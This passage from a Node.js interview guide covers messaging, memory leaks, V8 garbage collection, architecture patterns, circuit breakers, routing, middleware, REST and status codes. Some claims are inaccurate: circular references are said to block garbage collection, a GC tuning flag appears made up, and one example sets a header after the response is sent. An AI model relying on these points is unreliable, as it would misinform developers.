**Method: Message Queue (RabbitMQ, Kafka)**

```javascript
// Order Service publishes an event
const amqp = require('amqplib');

async function processOrder(orderId) {
  const connection = await amqp.connect('amqp://localhost');
  const channel = await connection.createChannel();
  
  // Declare a queue
  await channel.assertQueue('payment_queue');
  
  // Send message (don't wait for response)
  channel.sendToQueue(
    'payment_queue',
    Buffer.from(JSON.stringify({ orderId, amount: 100 }))
  );
  
  // Order Service continues immediately!
  return { success: true, message: 'Order queued for processing' };
}

// Meanwhile, Payment Service listens to the queue
channel.consume('payment_queue', async (msg) => {
  const data = JSON.parse(msg.content.toString());
  // Process payment...
  channel.ack(msg); // acknowledge message was processed
});
```

**Pros:**
- ✅ **Loose coupling** — services don't depend on each other
- ✅ **Fast** — no blocking, fire-and-forget
- ✅ **Scalable** — one slow service doesn't affect others
- ✅ **Resilient** — if service is down, message waits in queue

**Cons:**
- ❌ More complex — need a message broker
- ❌ No immediate feedback — you don't know right away if payment succeeded
- ❌ Harder to debug

#### 3. **Real-time Communication** — WebSockets / Server-Sent Events

For **live updates** — notifications, chat, live feeds.

**Method: WebSocket (Two-way, Real-time)**

```javascript
// Server side (Node.js)
const io = require('socket.io')(3000);

io.on('connection', (socket) => {
  console.log('User connected:', socket.id);
  
  // When Payment Service completes a payment
  socket.on('payment_complete', (data) => {
    // Send real-time update to Order Service
    io.emit('order_update', {
      orderId: data.orderId,
      status: 'Payment confirmed'
    });
  });
  
  socket.on('disconnect', () => {
    console.log('User disconnected');
  });
});

// Client side (React/Browser)
const socket = io('http://localhost:3000');

socket.on('order_update', (data) => {
  console.log('Real-time update:', data);
  // Update UI immediately
});
```

**Method: Server-Sent Events (One-way, Server to Client)**

```javascript
// Server pushes updates to client
app.get('/orders/:id/stream', (req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache'
  });
  
  // Keep connection open and send updates
  const interval = setInterval(() => {
    res.write(`data: ${JSON.stringify({ status: 'processing' })}\n\n`);
  }, 1000);
  
  res.on('close', () => clearInterval(interval));
});

// Client side
const eventSource = new EventSource('/orders/123/stream');
eventSource.onmessage = (event) => {
  console.log('Update:', JSON.parse(event.data));
};
```

**Pros:**
- ✅ Instant communication
- ✅ No polling (client constantly asking "is it done yet?")

**Cons:**
- ❌ More complex
- ❌ Requires persistent connection
- ❌ Not ideal for all scenarios

### Communication Pattern Comparison

| Pattern | When to use | Pros | Cons |
|---------|-----------|------|------|
| **HTTP/REST** | Simple request-response | Easy to implement | Tight coupling, blocking |
| **Message Queue** | Async tasks, decoupling | Scalable, resilient | Eventual consistency |
| **WebSocket** | Real-time notifications | Instant updates | Complex, resource-heavy |
| **gRPC** | Internal microservices | Fast, typed, binary | Steeper learning curve |

### The Typical E-commerce Flow

```
Customer places order
    ↓
Order Service (REST) → Order Created
    ↓
Order Service publishes "OrderCreated" event to queue
    ↓
Payment Service (listening) → processes payment
    ↓
Payment Service publishes "PaymentConfirmed" event
    ↓
Notification Service (listening) → sends email
    ↓
WebSocket → Real-time update sent to customer's browser
```

---

## 42. How to handle memory leaks in Node.js app? How does memory leak happen in Node.js?

### What is a Memory Leak?

Your app uses more and more memory over time, even when **no new data is being added**. It's like a water tank that fills and never empties — eventually it overflows.

### How Memory Leaks Happen in Node.js

#### Leak 1: **Forgotten Event Listeners**

```javascript
// ❌ Memory Leak
function setupListener() {
  const data = new Array(1000000).fill('data'); // large object
  
  server.on('request', () => {
    console.log(data); // closure keeps 'data' in memory
  });
  
  // If setupListener is called 1000 times, you have 1000 listeners
  // Each holds onto 'data' in memory!
}

// Called repeatedly (e.g., in a loop or per request)
for (let i = 0; i < 1000; i++) {
  setupListener();
}

// ✅ Fixed
function setupListener() {
  const data = new Array(1000000).fill('data');
  
  const handler = () => console.log(data);
  server.on('request', handler);
  
  // Remove listener when done
  return () => server.off('request', handler);
}

const unsubscribe = setupListener();
unsubscribe(); // clean up
```

#### Leak 2: **Global Variables That Grow**

```javascript
// ❌ Memory Leak
const cache = {}; // global cache that never clears

app.get('/data/:id', (req, res) => {
  if (!cache[req.params.id]) {
    cache[req.params.id] = expensiveComputation();
  }
  res.json(cache[req.params.id]);
});

// After millions of requests, cache has millions of entries
// Memory keeps growing!

// ✅ Fixed - Use TTL (Time To Live)
const NodeCache = require('node-cache');
const cache = new NodeCache({ stdTTL: 600 }); // auto-clear after 10 min

app.get('/data/:id', (req, res) => {
  let data = cache.get(req.params.id);
  if (!data) {
    data = expensiveComputation();
    cache.set(req.params.id, data);
  }
  res.json(data);
});
```

#### Leak 3: **Circular References**

```javascript
// ❌ Memory Leak
const obj1 = {};
const obj2 = {};

obj1.ref = obj2;
obj2.ref = obj1; // circular reference!

// Even when obj1 and obj2 go out of scope, they reference each other
// Garbage collector keeps them alive (older versions of Node)

// ✅ Modern Node.js has better GC, but still avoid circular refs
obj1.ref = null;
obj2.ref = null;
```

#### Leak 4: **Timers That Never Clear**

```javascript
// ❌ Memory Leak
function setupPolling() {
  const largeData = new Array(1000000).fill('data');
  
  setInterval(() => {
    console.log(largeData);
  }, 1000);
  // This interval runs forever, keeping largeData in memory forever
}

// ✅ Fixed - Clear the timer
let intervalId;

function setupPolling() {
  const largeData = new Array(1000000).fill('data');
  
  intervalId = setInterval(() => {
    console.log(largeData);
  }, 1000);
}

function stopPolling() {
  clearInterval(intervalId);
}
```

#### Leak 5: **Stream Memory Build-up**

```javascript
// ❌ Memory Leak - not handling back pressure
const readable = fs.createReadStream('huge-file.txt');
const writable = fs.createWriteStream('output.txt');

readable.on('data', (chunk) => {
  writable.write(chunk); // if writable is slow, chunks accumulate in memory!
});

// ✅ Fixed - Use pipe or handle back pressure
readable.pipe(writable); // handles back pressure automatically
```

### Detecting Memory Leaks

#### 1. **Monitor Memory Over Time**

```javascript
setInterval(() => {
  const mem = process.memoryUsage();
  console.log({
    heapUsed: `${Math.round(mem.heapUsed / 1024 / 1024)} MB`,
    heapTotal: `${Math.round(mem.heapTotal / 1024 / 1024)} MB`
  });
}, 5000);
```

If heapUsed keeps increasing even with no new requests = **memory leak**

#### 2. **Use clinic.js**

```bash
npm install -g clinic
clinic doctor -- node app.js
# Opens an interactive report showing memory trends
```

#### 3. **Chrome DevTools Heap Snapshots**

```bash
node --inspect app.js
# Visit chrome://inspect, take heap snapshots
# Compare snapshots over time to find what's growing
```

#### 4. **Use clinic.js Heap Profiler**

```bash
clinic bubbleprof -- node app.js
```

### Memory Leak Prevention Checklist

```
☑️ Remove event listeners when done
☑️ Clear intervals/timeouts
☑️ Avoid global variables that grow
☑️ Use caching with TTL (Time To Live)
☑️ Handle stream back pressure (use pipe())
☑️ Avoid circular references
☑️ Monitor memory regularly in production
☑️ Profile with clinic.js or Chrome DevTools
```

---

## 43. How does garbage collection work for Node.js application?

### What is Garbage Collection?

**Garbage Collection (GC)** is the automatic process of freeing up memory that's **no longer needed**.

Think of it like a cleanup crew: when you're done with an object (no code references it anymore), the GC throws it away to free up memory.

### Memory in Node.js

Node.js uses **V8** (Google's JavaScript engine). V8 manages memory in **different spaces**:

```
┌─────────────────────────────────────────┐
│           V8 Heap Memory                │
├─────────────────────────────────────────┤
│  New Space (Young Generation)           │
│  ├─ Objects created recently            │
│  └─ Most objects die young here         │
├─────────────────────────────────────────┤
│  Old Space (Old Generation)             │
│  ├─ Objects that survived 2+ GCs        │
│  └─ Long-lived objects                  │
├─────────────────────────────────────────┤
│  Large Object Space                     │
│  └─ Objects > 1MB                       │
└─────────────────────────────────────────┘
```

### Types of Garbage Collection in V8

#### 1. **Scavenge (Minor GC)** — Young Space Cleanup

- **Frequency**: Very often (every few milliseconds)
- **Time**: Fast (~1-2ms)
- **What it does**: Clears out short-lived objects from New Space

```javascript
function createUsers() {
  for (let i = 0; i < 1000; i++) {
    const user = { id: i, name: 'User' }; // born in New Space
    console.log(user);
    // user is garbage immediately after loop iteration
    // Scavenge clears these quickly
  }
}
```

#### 2. **Mark-Sweep (Major GC)** — Old Space Cleanup

- **Frequency**: Occasionally (when Old Space gets full)
- **Time**: Slower (~50-200ms) — **can pause entire app!**
- **What it does**: Deep scan of all objects, marks unreachable ones, sweeps them out

```javascript
const cache = {}; // this stays in Old Space

app.get('/data', (req, res) => {
  cache[req.id] = expensiveData(); // moves to Old Space
});

// After millions of requests, Old Space is full
// Major GC kicks in, app pauses for 100ms
// Users experience a brief lag spike
```

### How Garbage Collection Works — The Process

```
┌─ Object created (New Space)
│
├─ If survives 1-2 Minor GCs → moved to Old Space
│
├─ Old Space fills up → Major GC starts
│
├─ Mark Phase: V8 walks through all objects starting from "roots" (global vars, function scopes)
│  └─ Mark: "this object is still referenced"
│
├─ Sweep Phase: All unmarked objects are freed
│
├─ Compact Phase: Rearrange memory to remove fragmentation
│
└─ App resumes
```

### The GC Pause Problem

```javascript
// Every 30 seconds, Major GC might kick in
// App pauses for 200ms
// Users see a brief freeze

app.get('/data', (req, res) => {
  // At random moments, this might pause for 200ms
  res.json(data);
});
```

This is why **low-latency apps** (trading platforms, games) care deeply about GC tuning.

### Triggering Garbage Collection Manually

```bash
# Start Node with manual GC enabled
node --expose-gc app.js
```

```javascript
if (global.gc) {
  setInterval(() => {
    global.gc(); // Force garbage collection
  }, 60000); // Every 60 seconds
}
```

**Caution**: Manual GC is **not recommended** for most apps — the automatic GC is highly optimized.

### GC Tuning Parameters

```bash
# Increase heap size (less frequent GC)
node --max-old-space-size=4096 app.js

# Fine-tune scavenger
node --scavenge-retention-policy=retain app.js
```

### Monitoring GC in Your App

```javascript
// Use clinic.js to see GC pauses
clinic doctor -- node app.js

// Or use Chrome DevTools
node --inspect app.js
# chrome://inspect → open profiler → record → see GC spikes
```

### GC Best Practices

```
✅ DO:
1. Minimize object allocations in hot loops
2. Release references when done (set to null)
3. Use object pooling for frequently created objects
4. Monitor GC with clinic.js
5. Keep Old Space healthy — avoid cache bloat

❌ DON'T:
1. Manually trigger GC (except for testing)
2. Store unbounded data in globals
3. Create large objects in every request
4. Hold references longer than needed
5. Ignore GC pause times in production
```

---

## 44. What are different types of architecture patterns we can follow in Node.js apps?

### 1. **Monolithic Architecture**

Everything in one app.

```
┌─────────────────────┐
│  Node.js Monolith   │
├─────────────────────┤
│ - User Routes       │
│ - Order Routes      │
│ - Payment Routes    │
│ - Notification Code │
└─────────────────────┘
     ↓
  Single Database
```

**Pros**: Simple to start, all code together

**Cons**: Hard to scale, one part breaks everything

---

### 2. **Microservices Architecture**

Many independent services.

```
┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│User Service │  │Order Service│  │Payment Svc  │
└──────┬──────┘  └──────┬──────┘  └──────┬──────┘
       │                │               │
       └────────────────┼───────────────┘
                        ↓
                  Message Queue / API Gateway
```

**Pros**: Scalable, independent, fault-isolated

**Cons**: Complex networking, data consistency issues

---

### 3. **Layered Architecture** (Most Common for MVC apps)

```
┌─────────────────────────────┐
│   Presentation Layer        │  (Express routes, controllers)
├─────────────────────────────┤
│   Business Logic Layer      │  (Services, use cases)
├─────────────────────────────┤
│   Data Access Layer         │  (Repositories, DAOs)
├─────────────────────────────┤
│   Database Layer            │  (MongoDB, PostgreSQL)
└─────────────────────────────┘
```

**Example:**

```javascript
// routes/userRoutes.js (Presentation)
router.get('/users/:id', userController.getUser);

// controllers/userController.js
const getUser = async (req, res) => {
  const user = await userService.getUserById(req.params.id);
  res.json(user);
};

// services/userService.js (Business Logic)
const getUserById = async (id) => {
  const user = await userRepository.findById(id);
  return user;
};

// repositories/userRepository.js (Data Access)
const findById = async (id) => {
  return User.findById(id);
};
```

---

### 4. **Hexagonal Architecture** (Ports & Adapters)

The core business logic is **isolated** from external dependencies.

```
┌──────────────────────────────────────────┐
│          Core Business Logic             │
│      (Pure, no external dependencies)    │
└──────────────────────────────────────────┘
         ↑                    ↑
      Ports               Ports
         ↓                    ↓
    ┌────────┐          ┌────────┐
    │Express │          │Database│
    │Adapter │          │Adapter │
    └────────┘          └────────┘
```

**Benefit**: Business logic can be tested without Express or DB

---

### 5. **MVC Architecture** (Model-View-Controller)

```
User Input
    ↓
┌──────────┐
│Controller│  (Handles request, calls model)
└────┬─────┘
     ↓
┌──────────┐
│  Model   │  (Business logic, data)
└────┬─────┘
     ↓
┌──────────┐
│  View    │  (HTML template, JSON response)
└──────────┘
```

**Example with Express:**

```javascript
// routes
router.post('/users', userController.create);

// controller
const create = async (req, res) => {
  const user = await User.create(req.body);
  res.render('success', { user });
};

// model
const userSchema = new Schema({ name, email });
```

---

### 6. **Repository Pattern** (Data Abstraction)

Don't let your business logic directly access the database. Use a **Repository** as an intermediary.

```javascript
// ❌ BAD - Business logic talks to DB directly
const getUser = async (id) => {
  return User.findById(id); // tightly coupled to MongoDB
};

// ✅ GOOD - Business logic talks to repository
const getUser = async (id) => {
  return userRepository.findById(id);
};

// userRepository.js
const findById = async (id) => {
  return User.findById(id); // MongoDB specific
};

// If you switch to PostgreSQL, you only change userRepository
```

---

### 7. **Service-Oriented Architecture (SOA)**

Reusable **services** that multiple apps can use.

```
┌─────────────────────┐
│  Email Service      │  (shared by all apps)
└─────────────────────┘
         ↑
    ┌────┴────┐
    ↓         ↓
┌────────┐ ┌────────┐
│App 1   │ │App 2   │
└────────┘ └────────┘
```

**Example:**

```javascript
// emailService.js (Shared module)
const sendEmail = async (to, subject, body) => {
  // implementation
};

// Used by multiple apps
module.exports = { sendEmail };
```

---

### Choosing Your Architecture

| Architecture | Best for | Complexity |
|---|---|---|
| **Monolithic** | Small projects, single team | Low |
| **Layered (MVC)** | Traditional web apps | Medium |
| **Microservices** | Large, distributed systems | High |
| **Hexagonal** | Complex business logic | High |
| **Repository** | Any app needing flexibility | Medium |

---

## 45. What is the Circuit Breaker Pattern?

### The Problem It Solves

Imagine a restaurant that orders from a supplier. The supplier sometimes takes hours to deliver. The restaurant keeps ordering, waiting 3 hours, getting nothing. Customers leave hungry.

In systems, this happens when one service is broken, but another service keeps trying to call it, timing out, wasting resources.

### The Circuit Breaker Solution

A **Circuit Breaker** is like a **electrical circuit breaker** — when something goes wrong, it **cuts off** the circuit to prevent further damage.

States:

```
┌──────────┐
│  CLOSED  │  (normal, requests go through)
│(healthy) │
└────┬─────┘
     │ (errors exceed threshold)
     ↓
┌──────────┐
│  OPEN    │  (STOP sending requests, fail fast)
│(broken)  │  (return error immediately)
└────┬─────┘
     │ (after timeout, try again)
     ↓
┌──────────────┐
│ HALF_OPEN    │  (test if service recovered)
│(recovery)    │
└────┬─────────┘
     │
     ├─ (works?) → CLOSED
     └─ (fails?) → OPEN
```

### Code Implementation

```bash
npm install opossum
```

```javascript
const CircuitBreaker = require('opossum');
const axios = require('axios');

// Function that might fail
const callPaymentService = async (data) => {
  return axios.post('http://payment-service:3001/pay', data);
};

// Wrap it with Circuit Breaker
const breaker = new CircuitBreaker(callPaymentService, {
  timeout: 3000,           // If request takes > 3s, fail
  errorThresholdPercentage: 50, // If 50% of requests fail, open circuit
  resetTimeout: 30000      // After 30s in OPEN, try HALF_OPEN
});

app.post('/order', async (req, res) => {
  try {
    const payment = await breaker.fire(req.body);
    res.json({ success: true, payment });
  } catch (error) {
    if (error.message === 'breaker is open') {
      // Circuit is open, fail fast
      return res.status(503).json({ error: 'Payment service temporarily unavailable' });
    }
    // Other error
    res.status(500).json({ error: error.message });
  }
});

// Listen to circuit state changes
breaker.on('open', () => console.log('🔴 Circuit OPEN'));
breaker.on('halfOpen', () => console.log('🟡 Circuit HALF_OPEN - testing...'));
breaker.on('close', () => console.log('🟢 Circuit CLOSED - recovered'));
```

### Real Scenario

```
Time 0:   Payment Service is working
          Circuit: CLOSED ✅
          Order Service calls it → success

Time 5:   Payment Service crashes
          Order Service keeps calling → timeout
          
Time 7:   Errors reach 50%
          Circuit: OPEN 🔴
          Order Service calls breaker → immediately fails
          (no wasted timeout waiting)

Time 37:  After 30 seconds
          Circuit: HALF_OPEN 🟡
          Order Service makes one test call → Payment Service now working!
          
Time 38:  Circuit: CLOSED ✅
          System recovered, back to normal
```

### Benefits

- **Fail Fast**: Don't waste time calling dead services
- **Prevent Cascade Failures**: One service down doesn't bring down the whole system
- **Auto Recovery**: Automatically tests if service is back
- **User Experience**: Show meaningful error ("Service temporarily down") instead of timeout

---

## 46. What is routing and what are the different types of routing in Node.js apps?

### What is Routing?

Routing is **mapping URLs to handlers** — deciding which code runs based on the request URL.

```
GET /users       → getUsers handler
POST /users      → createUser handler
GET /users/:id   → getUser handler
PUT /users/:id   → updateUser handler
DELETE /users/:id → deleteUser handler
```

### Types of Routing

#### 1. **Basic Routing** (URL-based)

```javascript
const express = require('express');
const app = express();

app.get('/', (req, res) => {
  res.send('Home page');
});

app.get('/about', (req, res) => {
  res.send('About page');
});

app.listen(3000);
```

#### 2. **Dynamic Routing** (Parametric)

URL contains dynamic segments:

```javascript
// URL: /users/123
app.get('/users/:id', (req, res) => {
  const userId = req.params.id;
  res.json({ userId });
});

// URL: /posts/2024/01/my-article
app.get('/posts/:year/:month/:slug', (req, res) => {
  const { year, month, slug } = req.params;
  res.json({ year, month, slug });
});

// URL: /search?q=nodejs&limit=10
app.get('/search', (req, res) => {
  const { q, limit } = req.query;
  res.json({ query: q, limit });
});
```

#### 3. **Regex Routing** (Pattern matching)

```javascript
// Match any URL that starts with /api
app.get(/^\/api\/.*/, (req, res) => {
  res.json({ type: 'API request' });
});

// Match IDs that are numbers only
app.get('/users/:id(\\d+)', (req, res) => {
  // Only matches /users/123, not /users/abc
  res.json({ userId: req.params.id });
});
```

#### 4. **Method-based Routing** (HTTP verbs)

```javascript
// GET vs POST
app.get('/users', (req, res) => {
  res.json({ action: 'retrieve' });
});

app.post('/users', (req, res) => {
  res.json({ action: 'create' });
});

// Multiple methods on same route
app.all('/users/:id', (req, res) => {
  console.log(`${req.method} request on /users/:id`);
  next();
});
```

#### 5. **Router-based Routing** (Modular)

For **large apps**, organize routes into modules:

```javascript
// routes/userRoutes.js
const express = require('express');
const router = express.Router();

router.get('/', getAllUsers);
router.get('/:id', getUser);
router.post('/', createUser);
router.put('/:id', updateUser);
router.delete('/:id', deleteUser);

module.exports = router;

// app.js
app.use('/users', userRoutes);     // All /users/* routes
app.use('/posts', postRoutes);     // All /posts/* routes
app.use('/admin', adminRoutes);    // All /admin/* routes
```

#### 6. **API Versioning Routing**

```javascript
// Different endpoints for different API versions
app.use('/api/v1', v1Routes);  // /api/v1/users
app.use('/api/v2', v2Routes);  // /api/v2/users (different response format)
```

#### 7. **Nested Routing**

```javascript
// GET /users/123/posts/456
app.get('/users/:userId/posts/:postId', (req, res) => {
  res.json({
    user: req.params.userId,
    post: req.params.postId
  });
});
```

### Routing Priority (Express)

Express matches routes in **order of definition**:

```javascript
app.get('/users/new', (req, res) => {
  res.send('New user form'); // matches first
});

app.get('/users/:id', (req, res) => {
  res.send(`User ${req.params.id}`); // matches second
});

// Request: GET /users/new → returns "New user form"
// Request: GET /users/123 → returns "User 123"
```

---

## 47. What are middlewares and different types of middleware in Node.js apps?

### What is Middleware?

**Middleware** is code that **runs between receiving a request and sending a response**. Think of it as a **pipeline filter**.

```
Request → Middleware 1 → Middleware 2 → Middleware 3 → Route Handler → Response
```

Each middleware can:
- Modify the request/response
- End the request
- Pass control to the next middleware

### Built-in Middleware

```javascript
const express = require('express');
const app = express();

// Parse JSON bodies
app.use(express.json());

// Parse URL-encoded bodies
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static('public'));
```

### Creating Custom Middleware

```javascript
// Basic middleware
const myMiddleware = (req, res, next) => {
  console.log('Middleware running');
  next(); // pass to next middleware
};

app.use(myMiddleware);

// Middleware that modifies request
const addUser = (req, res, next) => {
  req.user = { id: 1, name: 'John' }; // attach to request
  next();
};

app.use(addUser);

app.get('/profile', (req, res) => {
  res.json(req.user); // { id: 1, name: 'John' }
});

// Middleware that ends request
const checkAuth = (req, res, next) => {
  if (req.headers.authorization) {
    next();
  } else {
    res.status(401).json({ error: 'Unauthorized' });
  }
};

app.get('/admin', checkAuth, (req, res) => {
  res.send('Admin panel');
});
```

### Types of Middleware

#### 1. **Application-level Middleware** (applies to all routes)

```javascript
app.use((req, res, next) => {
  console.log('This runs for every request');
  next();
});
```

#### 2. **Router-level Middleware** (applies to specific routes)

```javascript
const router = express.Router();

router.use((req, res, next) => {
  console.log('Only for /users routes');
  next();
});

router.get('/', (req, res) => {
  res.json({ users: [] });
});

app.use('/users', router);
```

#### 3. **Error-handling Middleware** (4 parameters)

```javascript
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Something went wrong' });
});
```

#### 4. **Third-party Middleware**

```javascript
const cors = require('cors');
const helmet = require('helmet');

app.use(cors());     // enable CORS
app.use(helmet());   // set security headers
```

#### 5. **Conditional Middleware** (only for certain routes)

```javascript
app.post('/admin', checkAuth, isAdmin, (req, res) => {
  // checkAuth and isAdmin run only for this route
});
```

### Common Middleware Examples

```javascript
// Logging middleware
const logger = (req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next();
};

// Timing middleware
const timing = (req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`Request took ${duration}ms`);
  });
  next();
};

// Auth middleware
const auth = (req, res, next) => {
  const token = req.headers.authorization;
  if (verifyToken(token)) {
    next();
  } else {
    res.status(401).send('Unauthorized');
  }
};

// CORS middleware
const allowCORS = (req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  next();
};

app.use(logger);
app.use(timing);
app.use(allowCORS);

app.post('/login', (req, res) => {
  // logger, timing, allowCORS run first
  res.json({ token: 'abc123' });
});

app.get('/protected', auth, (req, res) => {
  // logger, timing, allowCORS, then auth run
  res.send('Secret data');
});
```

### Middleware Execution Order

```javascript
app.use(middleware1);    // 1st
app.use(middleware2);    // 2nd

app.get('/users', middleware3, (req, res) => { // middleware3 runs 3rd
  // 4th
});

// Order: middleware1 → middleware2 → middleware3 → route handler
```

---

## 48. Tell me about REST APIs and REST Principles

### What is REST?

**REST** = Representational State Transfer

It's an **architecture style** for building web APIs. REST uses HTTP methods (GET, POST, PUT, DELETE) to perform operations on resources identified by URLs.

### Core REST Principles

#### 1. **Resource-oriented** (not action-oriented)

```javascript
// ❌ NOT REST - action-oriented
GET /getUsers
GET /getUserById?id=5
POST /createUser
POST /deleteUser?id=5

// ✅ REST - resource-oriented
GET /users           // get all users
GET /users/5         // get user 5
POST /users          // create user
DELETE /users/5      // delete user 5
PUT /users/5         // update user 5
```

#### 2. **Use HTTP Methods Correctly**

| Method | Purpose | Safe | Idempotent |
|--------|---------|------|-----------|
| **GET** | Retrieve | ✅ Yes | ✅ Yes |
| **POST** | Create | ❌ No | ❌ No |
| **PUT** | Replace entire resource | ❌ No | ✅ Yes |
| **PATCH** | Partial update | ❌ No | ❌ Maybe |
| **DELETE** | Delete | ❌ No | ✅ Yes |

```javascript
// GET - retrieve without side effects
app.get('/users/:id', (req, res) => {
  res.json(users[id]);
});

// POST - create (not idempotent)
app.post('/users', (req, res) => {
  const newUser = User.create(req.body);
  res.status(201).json(newUser);
});

// PUT - replace entire resource (idempotent)
app.put('/users/:id', (req, res) => {
  users[id] = req.body; // replaces completely
  res.json(users[id]);
});

// PATCH - partial update
app.patch('/users/:id', (req, res) => {
  users[id] = { ...users[id], ...req.body };
  res.json(users[id]);
});

// DELETE - remove resource
app.delete('/users/:id', (req, res) => {
  delete users[id];
  res.status(204).send();
});
```

#### 3. **Use Appropriate Status Codes**

(See Question 49 for detailed codes)

```javascript
// Create successful
res.status(201).json(newUser);

// No content
res.status(204).send();

// Bad request
res.status(400).json({ error: 'Invalid input' });

// Unauthorized
res.status(401).json({ error: 'Auth required' });

// Forbidden
res.status(403).json({ error: 'Access denied' });

// Not found
res.status(404).json({ error: 'User not found' });

// Server error
res.status(500).json({ error: 'Internal error' });
```

#### 4. **Stateless** (Server doesn't store client context)

```javascript
// Each request should contain all needed info
// Server doesn't "remember" previous requests

// Request 1
POST /login { email, password }

// Request 2 (must include auth info)
GET /users/profile
Authorization: Bearer <token>

// Server doesn't need to remember login from Request 1
```

#### 5. **Uniform Interface**

All resources follow the same patterns:

```javascript
// All resources follow same structure
GET /users
GET /posts
GET /comments

POST /users
POST /posts
POST /comments

PUT /users/:id
PUT /posts/:id
PUT /comments/:id

DELETE /users/:id
DELETE /posts/:id
DELETE /comments/:id
```

#### 6. **JSON Responses**

```javascript
// Consistent response format
res.json({
  success: true,
  data: { id: 1, name: 'John' },
  message: 'User created'
});
```

### REST API Example

```javascript
const express = require('express');
const app = express();

app.use(express.json());

// ========== USERS ==========

// List all users
app.get('/users', (req, res) => {
  res.json(users);
});

// Get specific user
app.get('/users/:id', (req, res) => {
  const user = users.find(u => u.id == req.params.id);
  if (!user) return res.status(404).json({ error: 'Not found' });
  res.json(user);
});

// Create user
app.post('/users', (req, res) => {
  const user = { id: Date.now(), ...req.body };
  users.push(user);
  res.status(201).json(user);
});

// Update user
app.put('/users/:id', (req, res) => {
  const user = users.find(u => u.id == req.params.id);
  if (!user) return res.status(404).json({ error: 'Not found' });
  Object.assign(user, req.body);
  res.json(user);
});

// Delete user
app.delete('/users/:id', (req, res) => {
  const index = users.findIndex(u => u.id == req.params.id);
  if (index === -1) return res.status(404).json({ error: 'Not found' });
  users.splice(index, 1);
  res.status(204).send();
});

app.listen(3000);
```

---

## 49. What are the different types of status codes used in REST API in detail?

### Status Code Categories

All HTTP status codes are **3 digits**: `[1-5][0-9][0-9]`

First digit indicates category:
- `1xx` — Informational
- `2xx` — Success
- `3xx` — Redirection
- `4xx` — Client Error
- `5xx` — Server Error

---

### 1xx — Informational (Rare)

#### **100 Continue**
"Server received request headers, client should send body"

```javascript
// Usually handled automatically by HTTP
```

---

### 2xx — Success

#### **200 OK**
Standard successful response.

```javascript
app.get('/users', (req, res) => {
  res.status(200).json(users); // or just res.json()
});
```

#### **201 Created**
Resource successfully created.

```javascript
app.post('/users', (req, res) => {
  const newUser = User.create(req.body);
  res.status(201).json(newUser); // created!
  // Should include Location header
  res.set('Location', `/users/${newUser.id}`);
});
```

#### **202 Accepted**
Request accepted but not completed (async processing).

```javascript
app.post('/process', (req, res) => {
  // Queue job for background processing
  processInBackground(req.body);
  res.status(202).json({ message: 'Processing started' });
});
```

#### **204 No Content**
Successful but no content to return.

```javascript
app.delete('/users/:id', (req, res) => {
  User.delete(req.params.id);
  res.status(204).send(); // nothing to return
});
```

---

### 3xx — Redirection

#### **301 Moved Permanently**
Resource moved to new URL permanently.

```javascript
app.get('/old-url', (req, res) => {
  res.status(301).redirect('/new-url');
  // Search engines will update their index
});
```

#### **302 Found**
Temporary redirect.

```javascript
app.get('/temp-redirect', (req, res) => {
  res.status(302).redirect('/new-location');
});
```

#### **304 Not Modified**
Client has cached version, no need to resend.

```javascript
app.get('/data', (req, res) => {
  const etag = '"abc123"';
  if (req.headers['if-none-match'] === etag) {
    res.status(304).send(); // not modified
  } else {
    res.set('ETag', etag);
    res.json(data);
  }
});
```

---

### 4xx — Client Error

#### **400 Bad Request**
Invalid request format.

```javascript
app.post('/users', (req, res) => {
  if (!req.body.email) {
    res.status(400).json({ error: 'Email required' });
  }
});
```

#### **401 Unauthorized**
Authentication required.

```javascript
app.get('/protected', (req, res) => {
  if (!req.headers.authorization) {
    res.status(401).json({ error: 'Login required' });
  }
});
```

#### **403 Forbidden**
Authenticated but not authorized.

```javascript
app.get('/admin', (req, res) => {
  if (req.user.role !== 'admin') {
    res.status(403).json({ error: 'Admin only' });
  }
});
```

#### **404 Not Found**
Resource doesn't exist.

```javascript
app.get('/users/:id', (req, res) => {
  const user = User.findById(req.params.id);
  if (!user) {
    res.status(404).json({ error: 'User not found' });
  }
});
```

#### **409 Conflict**
Request conflicts with current state (duplicate key, version mismatch).

```javascript
app.post('/users', (req, res) => {
  try {
    User.create(req.body); // email must be unique
  } catch (err) {
    if (err.code === 'DUPLICATE_KEY') {
      res.status(409).json({ error: 'Email already exists' });
    }
  }
});
```

#### **422 Unprocessable Entity**
Request well-formed but contains semantic errors.

```javascript
app.post('/users', (req, res) => {
  if (!isValidEmail(req.body.email)) {
    res.status(422).json({ error: 'Invalid email format' });
  }
});
```

#### **429 Too Many Requests**
Rate limit exceeded.

```javascript
app.use(rateLimit({
  max: 100,
  handler: (req, res) => {
    res.status(429).json({ error: 'Too many requests' });
  }
}));
```

---

### 5xx — Server Error

#### **500 Internal Server Error**
Unexpected server error.

```javascript
app.get('/data', (req, res) => {
  try {
    const data = computeData();
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});
```

#### **501 Not Implemented**
Feature not implemented yet.

```javascript
app.post('/export-to-pdf', (req, res) => {
  res.status(501).json({ error: 'Not implemented' });
});
```

#### **502 Bad Gateway**
Invalid response from upstream server (proxy issue).

```javascript
// When your proxy server can't reach the backend
```

#### **503 Service Unavailable**
Server temporarily down (maintenance, overload).

```javascript
if (maintenanceMode) {
  res.status(503).json({ error: 'Service temporarily unavailable' });
}
```

#### **504 Gateway Timeout**
Upstream server didn't respond in time.

```javascript
// When calling external API and it times out
```

---

### Status Code Decision Tree

```
Was request successful?
  ├─ YES
  │   ├─ Was something created? → 201
  │   ├─ Delete? → 204
  │   └─ Otherwise → 200
  │
  └─ NO (error)
      ├─ Is it the client's fault?
      │   ├─ Auth missing? → 401
      │   ├─ Forbidden? → 403
      │   ├─ Not found? → 404
      │   ├─ Bad format? → 400
      │   └─ Too many requests? → 429
      │
      └─ Is it the server's fault?
          ├─ Unexpected error? → 500
          ├─ Not implemented? → 501
          └─ Temporarily down? → 503
```

---

## 50. How can we transfer large files from UI to backend then back into cloud platform?

### The Challenge

Uploading a 1GB video directly:
- ❌ Consumes 1GB RAM on server
- ❌ Ties up server for entire upload
